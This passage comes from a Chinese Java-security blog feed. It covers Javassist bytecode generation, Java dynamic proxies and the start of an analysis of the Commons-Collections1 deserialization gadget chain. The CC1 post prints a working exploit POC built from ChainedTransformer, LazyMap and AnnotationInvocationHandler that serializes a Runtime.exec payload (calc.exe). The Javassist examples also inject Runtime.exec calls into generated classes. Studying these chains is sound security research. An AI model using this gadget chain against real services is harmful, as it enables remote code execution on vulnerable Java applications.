class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo(int id)&#123;this.id = id;&#125;&quot;</span>, ctClass);</span><br><span class="line">ctClass.addConstructor(ctConstructor1);</span><br></pre></td></tr></table></figure></li><li><p>添加方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcDemo()&#123;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">ctClass.addMethod(ctMethod);</span><br></pre></td></tr></table></figure></li></ul><ol start="4"><li><p>写入磁盘</p><p>这里写入磁盘可以用如下两种方法</p><ul><li>javassist自带的<code>ctClass.writeFile();</code>可指定绝对路径写入</li><li>也可转换为byte流通过<code>FileOutputStream</code>等写入磁盘</li></ul></li><li><p>进行验证：调用方法or属性赋值</p></li><li><p>tips：</p><ul><li>这里注意<code>javassist.CannotCompileException</code>异常: 因为同个 Class 是不能在同个 ClassLoader 中加载两次的，所以在输出 CtClass 的时候需要注意下,可以使用<code>javassist</code>自带的classloader解决此问题</li><li>反射时<code>newInstance()</code>抛出了<code>java.lang.InstantiationException</code>异常可能是因为没有写无参构造</li><li>如果已经加载了通过javassist生成的类，即便是通过反射(如<code>class.forName()</code>)或者<code>new</code>都不是加载一个<code>&quot;新类&quot;</code>，只有换一个ClassLoader加载才会是生成一个<code>&quot;新类&quot;</code></li></ul></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javassist.bytecode.AccessFlag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JavassistDemo01</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavassistDemo01</span>();</span><br><span class="line">        a.makeClass0();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeClass0</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//获取默认类池</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//创建一个类ClassDemo</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;com.sec.test2.ClassDemo&quot;</span>);</span><br><span class="line">        <span class="comment">//让该类实现序列化接口</span></span><br><span class="line">        ctClass.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.makeInterface(<span class="string">&quot;java.io.Serializable&quot;</span>)&#125;);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//新建一个int类型名为id的成员变量</span></span><br><span class="line">            <span class="type">CtField</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;id&quot;</span>, ctClass);</span><br><span class="line">            <span class="comment">//将id设置为public</span></span><br><span class="line">            id.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line">            <span class="comment">//将该id属性&quot;赋值&quot;给ClassDemo</span></span><br><span class="line">            ctClass.addField(id);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加无参构造方法</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo()&#123;&#125;;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加有参构造方法</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo(int id)&#123;this.id = id;&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(ctConstructor1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加普通方法1</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcDemo()&#123;java.lang.Runtime.getRuntime().exec(\&quot;cmd.exe /c calc.exe\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加普通方法2</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod1</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void hello()&#123;System.out.println(\&quot;Hello Javassist!!!\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(ctMethod1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将class文件写入磁盘</span></span><br><span class="line">            <span class="comment">//转换成字节流</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="comment">//写入磁盘</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">classPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;user.dir&quot;</span>), <span class="string">&quot;/src/main/java/com/sec/test2&quot;</span>), <span class="string">&quot;ClassDemo.class&quot;</span>);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(classPath);</span><br><span class="line">            fos.write(bytes);</span><br><span class="line">            fos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//验证-调用方法</span></span><br><span class="line">            <span class="comment">//注意这里可能会抛javassist.CannotCompileException异常因为同个 Class 是不能在同个 ClassLoader 中加载两次的，所以在输出 CtClass 的时候需要注意下</span></span><br><span class="line">            <span class="comment">//需要通过一个未加载该class的classloader加载即可，为此javassist内置了一个classloader</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取javassist的classloader</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(classPool);</span><br><span class="line">            System.out.println(<span class="string">&quot;loading&quot;</span>);</span><br><span class="line">            <span class="comment">//通过该classloader加载才是新的一个class</span></span><br><span class="line">            Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;com.sec.test2.ClassDemo&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射调用hello</span></span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>).invoke(clazz.newInstance());</span><br><span class="line">            <span class="comment">//反射调用calc</span></span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;calcDemo&quot;</span>).invoke(clazz.newInstance());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="动态获取类方法"><a href="#动态获取类方法" class="headerlink" title="动态获取类方法"></a>动态获取类方法</h4><ol><li>获取默认类池<code>ClassPool classPool = ClassPool.getDefault();</code></li><li>获取目标类<code>CtClass cc = cp.get();</code></li><li>获取类的方法<code>CtMethod m = cc.getDeclaredMethod();</code></li><li>插入任意代码<code>m.insertBefore(&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;);</code></li><li>转换为class对象<code>Class c = cc.toClass();</code></li><li>反射调用对象<code>JavassistDemo j= (JavassistDemo)c.newInstance();</code></li><li>执行方法<code>j.hello();</code></li></ol><p>tips：</p><ol><li>如果目标类未加载过，可以直接调用<code>toClass()</code>方法之后<code>new</code>一个该类的对象即可调用该类。</li><li>如果目标类已加载过，就需要用上面的方法，通过javassist的ClassLoader去加载后进行调用。</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/CoLo/p/15383642.html">https://www.cnblogs.com/CoLo/p/15383642.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;动态编程&quot;&gt;&lt;a href=&quot;#动态编程&quot; class=&quot;headerlink&quot; title=&quot;动态编程&quot;&gt;&lt;/a&gt;动态编程&lt;/h3&gt;&lt;p&gt;动态编程是相对于静态编程而言的,平时我们讨论比较多的就是静态编程语言，例如Java，与动态编程语言，例如JavaScript。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="动态编程" scheme="https://kpa1on.github.io/tags/%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Java动态代理</title>
    <link href="https://kpa1on.github.io/2022/04/25/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <id>https://kpa1on.github.io/2022/04/25/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</id>
    <published>2022-04-25T03:17:12.000Z</published>
    <updated>2022-04-26T05:00:15.721Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><p>为其他对象提供一个代理以控制对某个对象的访问。代理类主要负责为委托了（真实对象）预处理消息、过滤消息、传递消息给委托类，代理类不现实具体服务，而是利用委托类来完成服务，并将执行结果封装处理。</p><span id="more"></span><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>创建一个接口，然后创建被代理的类实现该接口并且实现该接口中的抽象方法。之后再创建一个代理类，同时使其也实现这个接口。在代理类中持有一个被代理对象的引用，而后在代理类方法中调用该对象的方法。</p><p>接口：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">HelloInterface</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span>()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>被代理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello proxy!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloProxy</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">HelloInterface</span> <span class="variable">helloInterface</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before invoke sayHello&quot;</span> );</span><br><span class="line">        helloInterface.sayHello();</span><br><span class="line">        System.out.println(<span class="string">&quot;After invoke sayHello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代理类调用：<br> 被代理类被传递给了代理类<code>HelloProxy</code>，代理类在执行具体方法时通过所持用的被代理类完成调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloProxy helloProxy = <span class="keyword">new</span> <span class="built_in">HelloProxy</span>();</span><br><span class="line">        helloProxy.<span class="built_in">sayHello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">输出：</span><br><span class="line">Before invoke sayHello</span><br><span class="line">Hello proxy!</span><br><span class="line">After invoke sayHello</span><br></pre></td></tr></table></figure><p>使用静态代理很容易就完成了对一个类的代理操作。但是静态代理的缺点也暴露了出来：由于代理只能为一个类服务，如果需要代理的类很多，那么就需要编写大量的代理类，比较繁琐。</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>利用反射机制在运行时创建代理类。接口、被代理类不变，我们构建一个<code>handler</code>类来实现<code>InvocationHandler</code>接口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import proxy.UserService;</span><br><span class="line">import proxy.UserServiceImpl;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">public class Client2 &#123;</span><br><span class="line">    public static void main(String[] args) throws IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        // 设置变量可以保存动态代理类，默认名称以 $Proxy0 格式命名</span><br><span class="line">       //System.getProperties().setProperty(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);</span><br><span class="line">        // 1. 创建被代理的对象，UserService接口的实现类</span><br><span class="line">        HelloInterface hello = new Hello();</span><br><span class="line">        // 2. 获取对应的 ClassLoader</span><br><span class="line">        ClassLoader classLoader = userServiceImpl.getClass().getClassLoader();</span><br><span class="line">        // 3. 获取所有接口的Class，这里的UserServiceImpl只实现了一个接口UserService，</span><br><span class="line">        Class[] interfaces = hello.getClass().getInterfaces();</span><br><span class="line">        // 4. 创建一个将传给代理类的调用请求处理器，处理所有的代理对象上的方法调用</span><br><span class="line">        //     这里创建的是一个自定义的处理器，须传入实际的执行对象 hello</span><br><span class="line">        InvocationHandler helloHandler = new HelloHandler(hello);</span><br><span class="line">        /*</span><br><span class="line">   5.根据上面提供的信息，创建代理对象 在这个过程中，</span><br><span class="line">               a.JDK会通过根据传入的参数信息动态地在内存中创建和.class 文件等同的字节码</span><br><span class="line">               b.然后根据相应的字节码转换成对应的class，</span><br><span class="line">               c.然后调用newInstance()创建代理实例</span><br><span class="line"> */</span><br><span class="line">        HelloInterface proxy = (HelloInterface) Proxy.newProxyInstance(classLoader, interfaces, helloHandler);</span><br><span class="line">        // 调用代理的方法</span><br><span class="line">        proxy.sayHello();</span><br><span class="line">        // 保存JDK动态代理生成的代理类，类名保存为 HelloProxy</span><br><span class="line">        // ProxyUtils.generateClassFile(proxy.getClass(), &quot;HelloProxy&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425143320115-109776722.png" alt="image-20220425143318908"></p><p><code>InvocationHandler</code>和<code>Proxy</code>的主要方法有</p><p><strong>java.lang.reflect.InvocationHandler</strong></p><p><code>Object invoke(Object proxy, Method method, Object[] args)</code>定义了代理对象调用方法时希望执行的动作，用于集中处理在动态代理类对象上的方法调用</p><p><strong>java.lang.reflect.Proxy</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static InvocationHandler getInvocationHandler(Object proxy)用于获取指定代理对象所关联的调用处理器</span><br><span class="line"></span><br><span class="line">static Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces)返回指定接口的代理类</span><br><span class="line"></span><br><span class="line">static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) 构造实现指定接口的代理类的一个新实例，所有方法会调用给定处理器对象的 invoke 方法</span><br><span class="line"></span><br><span class="line">static boolean isProxyClass(Class&lt;?&gt; cl)返回 cl 是否为一个代理类</span><br></pre></td></tr></table></figure><p>动态代理具体步骤：</p><ol><li>通过实现 <code>InvocationHandler</code> 接口创建自己的调用处理器；</li><li>通过为 Proxy 类指定 <code>ClassLoader</code> 对象和一组 interface 来创建动态代理类；</li><li>通过反射机制获得动态代理类的构造函数，其唯一参数类型是调用处理器接口类型；</li><li>通过构造函数创建动态代理类实例，构造时调用处理器对象作为参数被传入。</li><li>调用方法的时候通过 <code>super.h.invoke(this, m1, (Object[])null);</code> 调用，其中的 <code>super.h.invoke</code> 实际上是在创建代理的时候传递给 <code>Proxy.newProxyInstance</code> 的 <code>Handler</code> 对象，它继承 <code>InvocationHandler</code> 类，负责实际的调用处理逻辑。</li><li><code>Handler</code> 的 <code>invoke</code> 方法接收到 method、args 等参数后，进行一些处理，然后通过反射让被代理的对象 target 执行方法。</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/347141071?msclkid=0fbfe08dc46311ecae26c4e44894f809">https://zhuanlan.zhihu.com/p/347141071?msclkid=0fbfe08dc46311ecae26c4e44894f809</a></p><p><a href="https://www.jianshu.com/p/9bcac608c714?msclkid=b40c8c68c44511ecb19300522d8d7118">https://www.jianshu.com/p/9bcac608c714?msclkid=b40c8c68c44511ecb19300522d8d7118</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;代理模式&quot;&gt;&lt;a href=&quot;#代理模式&quot; class=&quot;headerlink&quot; title=&quot;代理模式&quot;&gt;&lt;/a&gt;代理模式&lt;/h3&gt;&lt;p&gt;为其他对象提供一个代理以控制对某个对象的访问。代理类主要负责为委托了（真实对象）预处理消息、过滤消息、传递消息给委托类，代理类不现实具体服务，而是利用委托类来完成服务，并将执行结果封装处理。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代理" scheme="https://kpa1on.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons-Collections1分析（三）</title>
    <link href="https://kpa1on.github.io/2022/04/25/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://kpa1on.github.io/2022/04/25/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2022-04-25T01:52:41.000Z</published>
    <updated>2022-04-26T04:56:23.068Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="cc链的另一种构造方式"><a href="#cc链的另一种构造方式" class="headerlink" title="cc链的另一种构造方式"></a>cc链的另一种构造方式</h3><p>接着上篇的分析，上文中讲到<code>LazyMap</code>通过<code>get()</code>方法可以达到利用链触发命令执行</p><span id="more"></span><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425100217366-1661900816.png" alt="image-20220425100216545"></p><p>根据<code>get()</code>方法克制，根据传入的key进行判断，如果map中不包含此key，就会通过<code>factory</code>调用<code>transform()</code>方法，这里的<code>factory</code>是可以通过构造方法进行赋值的，那么这里可以将<code>factory</code>的值赋值为<code>ChainedTransformers</code>,就可以触发后面的调用链完成命令执行。但可以看到<code>LazyMap</code>的构造方法是被<code>protected</code>关键词修饰的，是无法直接进行new创建的，</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425100840761-1896569264.png" alt="image-20220425100840057"></p><p>查找其他函数时，发现<code>decorate()</code>方法可以完成<code>factory</code>的赋值。这也是为什么在前面的POC里面我们调用该方法并传入<code>innerMap</code>和<code>transformerChain</code>参数。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425101040851-1566624004.png" alt="image-20220425101040219"></p><p>这里传入的<code>innerMap</code>为为一个Map集合，<code>transformerChain</code>为一个被<code>ChainedTransformer</code>修饰过的<code>Transformer[]</code>数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><p>调试分析，首先进入<code>decorate()</code>方法，完成<code>factory</code>的赋值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425101914918-253951094.png" alt="image-20220425101914180"></p><p>下一步进入get()方法，调用<code>transform()</code>方法，后续就是循环调用<code>Transformer#transform</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425102027194-2090880442.png" alt="image-20220425102026291"></p><p>上面是我们测试的POC的调用过程，但在实际利用中，如何让它调用到我们的<code>get()</code>方法呢，在上篇中<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法会调用<code>get()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425180003976-1607958223.png" alt="image-20220425180002813"></p><p>根据构造方法传入第⼀个参数是⼀个<code>Annotation</code>类类型参数，该类是注解类，第二个是map类型参数，这个参数可以传<code>LazyMap</code>类型的对象去调用<code>get()</code>方法，<code>get()</code>方法调用<code>transform()</code>,</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425180049855-1977873704.png" alt="image-20220425180049496"></p><p>怎么去调用<code>AnnotationInvocationHandler</code>的<code>invoke</code></p><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        Class clazz =</span><br><span class="line">                Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                Map.class);</span><br><span class="line">        construct.setAccessible(true);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;1.txt&quot;));</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看下这行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>这里的<code>handler</code>是反射创建的一个 <code>AnnotationInvocationHandler</code>类。而<code>AnnotationInvocationHandler</code>中实现了<code>InvocationHandler</code>接口，可以直接作为调用处理器传入。在poc执行反序列化时，由于<code>AnnotationInvocationHandler</code>重写了<code>readObject()</code>方法，并且<code>readObject()</code>方法会调用<code>memberValues.entrySet().iterator()</code>，这里的<code>memberValues</code>即为被代理类<code>LazyMap</code>，通过构造方法传入并赋值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426000620806-1633479758.png" alt="image-20220426000617958"></p><p>在下面代理对象是<code>proxyMap</code>，当调用<code>proxyMap</code>的<code>entrySet()</code>会触发到<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法进行执行。这也是动态代理的一个特性，代理对象调用任意方法，调用处理器中的<code>invoke()</code>方法都会执行一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, 